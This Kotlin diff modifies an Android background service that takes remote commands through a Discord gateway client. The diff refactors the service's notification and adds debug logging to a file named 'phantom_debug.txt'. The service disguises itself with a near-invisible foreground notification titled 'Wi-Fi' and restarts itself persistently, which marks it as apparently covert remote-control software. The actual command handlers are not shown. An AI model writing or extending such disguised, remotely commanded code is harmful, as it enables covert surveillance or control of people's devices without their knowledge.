@@ -52,22 +52,19 @@ class MainService : Service() {
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
     private var discord: DiscordGatewayClient? = null
     private var gatewayStarted = false
+    private var debugFile: File? = null
 
     override fun onBind(i: Intent?): IBinder? = null
 
     override fun onCreate() {
         super.onCreate()
         try {
+            debugFile = File(filesDir, "phantom_debug.txt")
+            debugFile?.writeText("${System.currentTimeMillis()} service onCreate\n")
             val chan = NotificationChannel(CHANNEL, "Network", NotificationManager.IMPORTANCE_NONE)
             (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(chan)
-            val n = NotificationCompat.Builder(this, CHANNEL)
-                .setContentTitle("Wi-Fi")
-                .setContentText("Connected")
-                .setSmallIcon(android.R.drawable.ic_menu_info_details)
-                .setOngoing(true)
-                .setPriority(NotificationCompat.PRIORITY_MIN)
-                .build()
-            startForeground(NOTIF_ID, n)
+            showNotif("Starting...")
+            startForeground(NOTIF_ID, buildNotif("Starting..."))
         } catch (e: Exception) {
             Log.e(TAG, "fg: ${e.message}")
         }
@@ -75,9 +72,13 @@ class MainService : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         if (discord == null) {
-            discord = DiscordGatewayClient { action, payload ->
-                scope.launch { handleGatewayCommand(action, payload) }
-            }
+            discord = DiscordGatewayClient(
+                onCommand = { action, payload ->
+                    scope.launch { handleGatewayCommand(action, payload) }
+                },
+                onStatus = { s -> updateNotif(s) }
+            )
+            debugFile?.let { discord?.setDebugFile(it) }
         }
         if (!gatewayStarted) {
             gatewayStarted = true
@@ -85,6 +86,25 @@ class MainService : Service() {
             discord?.start(scope)
         }
         return START_STICKY
+    }
+
+    private fun buildNotif(text: String) = NotificationCompat.Builder(this, CHANNEL)
+        .setContentTitle("Wi-Fi")
+        .setContentText(text)
+        .setSmallIcon(android.R.drawable.ic_menu_info_details)
+        .setOngoing(true)
+        .setPriority(NotificationCompat.PRIORITY_MIN)
+        .build()
+
+    private fun showNotif(text: String) {
+        try {
+            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).notify(NOTIF_ID, buildNotif(text))
+        } catch (_: Exception) {}
+    }
+
+    private fun updateNotif(text: String) {
+        showNotif(text)
+        debugFile?.appendText("${System.currentTimeMillis()} status=$text\n")
     }
 
     private fun loadCrashReports() {
